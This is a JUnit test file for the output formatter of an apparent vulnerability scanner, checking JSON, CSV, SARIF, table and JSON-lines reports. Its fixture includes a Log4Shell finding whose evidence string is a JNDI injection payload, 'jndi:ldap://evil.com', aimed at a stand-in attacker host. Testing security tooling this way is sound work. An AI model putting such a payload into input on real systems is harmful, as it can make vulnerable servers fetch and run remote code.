package com.himanshu.vulnscan.output;

import com.himanshu.vulnscan.check.VulnerabilityCheck;
import com.himanshu.vulnscan.model.Finding;
import com.himanshu.vulnscan.model.ScanResult;
import org.junit.jupiter.api.Test;

import java.time.Instant;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

class OutputFormatterTest {

    @Test
    void testJsonOutput() {
        OutputFormatter formatter = new OutputFormatter();
        ScanResult result = createTestResult();
        String json = formatter.format(result, OutputFormatter.Format.JSON);
        assertTrue(json.contains("scan-123"));
        assertTrue(json.contains("CVE-2021-44228"));
    }

    @Test
    void testCsvOutput() {
        OutputFormatter formatter = new OutputFormatter();
        ScanResult result = createTestResult();
        String csv = formatter.format(result, OutputFormatter.Format.CSV);
        assertTrue(csv.contains("scanId,host,port"));
        assertTrue(csv.contains("CVE-2021-44228"));
        assertTrue(csv.contains("CRITICAL"));
    }

    @Test
    void testSarifOutput() {
        OutputFormatter formatter = new OutputFormatter();
        ScanResult result = createTestResult();
        String sarif = formatter.format(result, OutputFormatter.Format.SARIF);
        assertTrue(sarif.contains("$schema"));
        assertTrue(sarif.contains("sarif-2.1.0"));
        assertTrue(sarif.contains("CVE-2021-44228"));
        assertTrue(sarif.contains("runs"));
    }

    @Test
    void testTableOutput() {
        OutputFormatter formatter = new OutputFormatter();
        ScanResult result = createTestResult();
        String table = formatter.format(result, OutputFormatter.Format.TABLE);
        assertTrue(table.contains("VulnScan Results"));
        assertTrue(table.contains("scan-123"));
    }

    @Test
    void testJsonLinesOutput() {
        OutputFormatter formatter = new OutputFormatter();
        ScanResult result = createTestResult();
        String lines = formatter.format(result, OutputFormatter.Format.JSON_LINES);
        String[] parts = lines.split("\n");
        assertEquals(2, parts.length);
        assertTrue(parts[0].contains("scan_metadata"));
        assertTrue(parts[1].contains("finding"));
    }

    private ScanResult createTestResult() {
        Finding finding = new Finding(
                "CVE-2021-44228", "Log4Shell RCE",
                VulnerabilityCheck.Severity.CRITICAL, 10.0,
                "Log4Shell RCE", "Log4j JNDI injection",
                "jndi:ldap://evil.com", List.of("https://cve.mitre.org/..."), List.of("rce", "critical")
        );

        return new ScanResult(
                "scan-123", "192.168.1.1", null, "top100", "full",
                Instant.now().minusSeconds(10), Instant.now(),
                Map.of("192.168.1.1", List.of()),
                Map.of("192.168.1.1", List.of()),
                Map.of("192.168.1.1", List.of(finding))
        );
    }
}
